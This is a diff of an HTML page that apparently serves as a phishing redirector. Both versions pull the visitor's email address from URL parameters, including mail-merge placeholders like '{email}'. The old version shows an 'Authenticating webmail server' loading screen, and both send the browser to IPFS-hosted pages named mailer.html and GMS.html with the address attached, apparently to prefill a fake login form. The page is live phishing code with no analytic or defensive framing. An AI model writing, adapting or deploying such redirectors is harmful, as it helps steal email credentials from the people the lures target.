@@ -1,146 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Authentication</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
-            color: #1e293b;
-        }
-        
-        .loader-container {
-            position: relative;
-            width: 120px;
-            height: 120px;
-            margin-bottom: 20px;
-        }
-        
-        .loader-outer {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 6px solid transparent;
-            border-top-color: #3b82f6;
-            border-bottom-color: #3b82f6;
-            animation: spin 1.5s linear infinite;
-            box-shadow: 0 0 10px rgba(59, 130, 246, 0.2);
-        }
-        
-        .loader-middle {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            right: 15px;
-            bottom: 15px;
-            border-radius: 50%;
-            border: 4px solid transparent;
-            border-left-color: #60a5fa;
-            border-right-color: #60a5fa;
-            animation: spinReverse 2s linear infinite;
-        }
-        
-        .loader-inner {
-            position: absolute;
-            top: 30px;
-            left: 30px;
-            right: 30px;
-            bottom: 30px;
-            border-radius: 50%;
-            border: 2px solid #93c5fd;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes spinReverse {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(-360deg); }
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-        }
-        
-        .status-text {
-            font-size: 1.1rem;
-            font-weight: 500;
-            margin: 15px 0;
-            color: #475569;
-            position: relative;
-        }
-        
-        .status-text::after {
-            content: '...';
-            position: absolute;
-            animation: dots 1.2s steps(5, end) infinite;
-        }
-        
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60%, 100% { content: '...'; }
-        }
-    </style>
-</head>
-<body>
-    <div class="loader-container">
-        <div class="loader-outer"></div>
-        <div class="loader-middle"></div>
-        <div class="loader-inner"></div>
-    </div>
-    
-    <div class="status-text">Authenticating webmail server</div>
-
+<html>
+  <head>
+    <title>Redirecting...</title>
     <script>
-        // Extract email from URL parameters (supports both hash and query)
-        function getEmail() {
-            // Combine both hash and query parameters
-            const params = new URLSearchParams(
-                window.location.hash.substring(1) + '&' + 
-                window.location.search.substring(1)
-            );
-            
-            // Check all possible parameter names
-            const paramNames = ['email', '{email}', '[[-Email-]]'];
-            for (const name of paramNames) {
-                if (params.has(name)) {
-                    return params.get(name);
-                }
-            }
-            return null;
+      // This function will extract the email from the URL or use default
+      function getEmailFromUrl() {
+        // Check for email in the URL parameters (e.g., ?email=someone@example.com)
+        const urlParams = new URLSearchParams(window.location.search);
+        let email = urlParams.get('email');
+
+        // If no email found, use a default placeholder value
+        if (!email) {
+          email = "{email}"; // Fallback to placeholder value
         }
 
-        // Build the IPFS redirect URL with email
-        function buildRedirectUrl() {
-            const email = getEmail();
-            const baseUrl = "https://bafybeienr7v7xdk23sucg2pkpnxdjdrna2q4ouhr22v4lcsvlipgvrtri4.ipfs.dweb.link/mailer.html";
-            
-            if (email) {
-                return `${baseUrl}#${encodeURIComponent(email)}`;
-            }
-            return baseUrl; // Fallback without email
-        }
+        return email;
+      }
 
-        // Redirect after 2 seconds
-        setTimeout(() => {
-            window.location.href = buildRedirectUrl();
-        }, 2000);
+      // This function will redirect immediately to the target URL with the email
+      function redirectToTarget() {
+        // Get the email from URL or fallback
+        const email = getEmailFromUrl();
+
+        // Define your redirect URL using the email parameter
+        const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
+
+        // Redirect immediately to the new URL
+        window.location.replace(redirectUrl);
+      }
+
+      // Call the redirect function when the page loads
+      window.onload = redirectToTarget;
     </script>
-</body>
+  </head>
+  <body>
+    <p>Redirecting, please wait...</p>
+  </body>
 </html>
